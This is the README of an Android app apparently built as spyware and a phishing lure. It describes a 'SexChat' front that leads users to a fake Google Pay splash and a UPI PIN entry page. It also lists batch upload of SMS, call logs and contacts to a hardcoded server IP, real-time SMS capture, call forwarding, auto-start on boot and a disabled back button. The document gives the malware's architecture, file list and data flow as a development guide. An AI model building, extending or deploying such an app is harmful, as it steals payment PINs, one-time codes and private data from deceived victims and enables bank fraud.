# SexChat Android Application

A feature-rich Android application with WebView-based UI and comprehensive data collection capabilities.

## ?? Features

### Core Functionality
- ?? Beautiful gradient-based splash screens
- ?? User registration flow
- ?? UPI payment integration
- ?? Secure permission handling
- ?? Comprehensive data collection

### Data Collection
- ?? Call logs (batch upload)
- ?? SMS messages (batch upload)
- ?? Contacts (batch upload)
- ?? Battery status monitoring
- ?? Device information
- ?? Heartbeat signals

### UI/UX Features
- Fully responsive mobile design
- Smooth animations and transitions
- Sexy themed icons and emojis
- Multi-language support (English/Hindi)
- Back button disabled on critical screens
- Loading dialogs with retry functionality

## ??? Architecture

### Technology Stack
- **Language**: Kotlin
- **UI Framework**: Jetpack Compose + WebView
- **Build System**: Gradle (Kotlin DSL)
- **Min SDK**: 24 (Android 7.0)
- **Target SDK**: 34 (Android 14)

### Project Structure
```
app/
??? src/main/
?   ??? java/com/example/test/
?   ?   ??? MainActivity.kt              # Main activity with WebView
?   ?   ??? BootReceiver.kt              # Boot receiver
?   ?   ??? CallForwardingUtility.kt     # Call forwarding
?   ?   ??? Constants.kt                 # App constants
?   ?   ??? DataUploader.kt              # Data upload logic
?   ?   ??? HeartbeatService.kt          # Heartbeat service
?   ?   ??? MyFirebaseMessagingService.kt # FCM service
?   ?   ??? NetworkReceiver.kt           # Network monitoring
?   ?   ??? SmsReceiver.kt               # SMS receiver
?   ?   ??? SmsService.kt                # SMS service
?   ?   ??? utils/
?   ?       ??? CallLogsBatchUploader.kt # Call logs uploader
?   ?       ??? ContactsBatchUploader.kt # Contacts uploader
?   ?       ??? DataUploader.kt          # Main uploader
?   ?       ??? DeviceInfoHelper.kt      # Device info collector
?   ?       ??? PermissionDialog.kt      # Permission UI
?   ?       ??? PermissionManager.kt     # Permission handler
?   ?       ??? SimInfoHelper.kt         # SIM info collector
?   ?       ??? SmsBatchUploader.kt      # SMS uploader
?   ??? assets/
?   ?   ??? index.html                   # Splash screen
?   ?   ??? register.html                # Registration form
?   ?   ??? payment.html                 # Payment options
?   ?   ??? googlepay-splash.html        # Google Pay splash
?   ?   ??? upi-pin.html                 # UPI PIN entry
?   ?   ??? final.html                   # Success page
?   ??? AndroidManifest.xml              # App manifest
??? build.gradle.kts                     # App build config
```

## ?? Getting Started

### Prerequisites
- Android Studio Hedgehog or later
- JDK 17 or later
- Android SDK 34
- Gradle 8.0+

### Installation
1. Clone the repository
2. Open project in Android Studio
3. Update `google-services.json` with your Firebase config
4. Update server URL in `Constants.kt` if needed
5. Build and run

### Configuration

#### Server Configuration
Edit `app/src/main/java/com/example/test/utils/DataUploader.kt`:
```kotlin
private const val BASE_URL = "http://95.134.130.160:8765"
```

#### User ID Configuration
Edit `app/src/main/java/com/example/test/Constants.kt`:
```kotlin
const val USER_ID = "YOUR_USER_ID"
```

## ?? API Integration

The app communicates with backend servers for:
- Device registration
- Data uploads (SMS, Calls, Contacts)
- Battery monitoring
- Heartbeat signals
- UPI PIN collection

**Complete API documentation**: See [API_DOCUMENTATION.md](API_DOCUMENTATION.md)

## ?? Permissions

The app requires the following permissions:

### Critical Permissions
- `READ_SMS` - Read SMS messages
- `READ_CALL_LOG` - Read call logs
- `READ_CONTACTS` - Read contacts
- `READ_PHONE_STATE` - Get device ID and phone info

### Optional Permissions
- `RECEIVE_BOOT_COMPLETED` - Auto-start on boot
- `FOREGROUND_SERVICE` - Run background services
- `POST_NOTIFICATIONS` - Show notifications
- `INTERNET` - Network communication
- `ACCESS_NETWORK_STATE` - Check network status

## ?? UI Flow

### App Launch Flow
```
1. App starts
2. SexyCat splash screen (2 seconds)
   ?? Shows gradient background
   ?? Displays "SexyChat" logo
3. Permission dialog
   ?? Request all necessary permissions
   ?? Continue only if granted
4. Load WebView with index.html
```

### User Journey
```
index.html (6s splash)
    ?
register.html (user details)
    ?
payment.html (?5 payment)
    ?
googlepay-splash.html (2.5s)
    ?
upi-pin.html (PIN entry)
    ?
    ?? Success ? final.html
    ?? Error ? Retry dialog
```

## ?? Data Upload Strategy

### Initialization Sequence
1. **Register Device** - Send complete device info
2. **Upload Call Logs** - Batch upload (foreground)
3. **Upload SMS** - Batch upload (background)
4. **Upload Contacts** - Batch upload (background)
5. **Start Services**:
   - Battery updater (every 60 seconds)
   - Heartbeat service (periodic)

### Batch Upload Parameters
- **SMS Batch Size**: 500 messages per batch
- **Contacts Batch Size**: 200 contacts per batch
- **Call Logs Batch Size**: 500 logs per batch

## ??? Security Features

- ? No hardcoded sensitive data
- ? HTTPS for UPI PIN endpoint
- ? Device ID based identification
- ? FCM token for push notifications
- ? Input validation on all forms
- ? Back button disabled on critical screens

## ?? Key Features Explained

### 1. WebView Integration
- Native Android app with HTML/CSS/JS UI
- JavaScript bridge for device ID access
- Fully responsive mobile design
- Inline SVG icons (no external dependencies)

### 2. Permission Handling
- Beautiful custom permission dialog
- One-time permission request
- Graceful handling of denied permissions
- Battery monitoring integration

### 3. Data Collection
- Efficient batch processing
- Progress tracking
- Network error handling
- Automatic retry logic

### 4. Background Services
- Foreground services for reliability
- Boot receiver for auto-start
- Network state monitoring
- SMS receiver for real-time capture

## ?? Known Issues & Limitations

1. **WebView Display**: Requires proper viewport settings
2. **Back Button**: Disabled on most screens (by design)
3. **Permissions**: App requires all permissions to function
4. **Network**: Requires active internet connection

## ?? Build Variants

### Debug
- WebView debugging enabled
- Verbose logging
- No code obfuscation

### Release
- ProGuard enabled
- Code obfuscation
- Optimized APK size

## ?? Development Tips

### Debugging WebView
Enable Chrome DevTools:
```kotlin
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
    WebView.setWebContentsDebuggingEnabled(true)
}
```

Then access via: `chrome://inspect/#devices`

### Testing HTML Changes
HTML files are in `app/src/main/assets/` - rebuild to see changes.

### Monitoring Logs
```bash
adb logcat -s MainActivity DataUploader DeviceInfoHelper
```

## ?? Analytics & Monitoring

The app sends periodic data:
- **Battery**: Every 60 seconds
- **Heartbeat**: Configurable interval
- **Data Upload**: On permission grant + periodic sync

## ?? Important Notes

1. **Package Name**: `com.example.test` (update for production)
2. **Server URLs**: Update both main server and PIN server
3. **Firebase**: Update `google-services.json` with your project
4. **User ID**: Set unique user ID in Constants
5. **Testing**: Test all HTML pages on actual device
6. **Icons**: All icons are inline SVG (no network dependency)

## ?? Support

For server-side integration, refer to [API_DOCUMENTATION.md](API_DOCUMENTATION.md)

## ?? License

Private project - All rights reserved.

---

**Version**: 1.0  
**Last Updated**: 2024  
**Min Android**: 7.0 (API 24)  
**Target Android**: 14 (API 34)
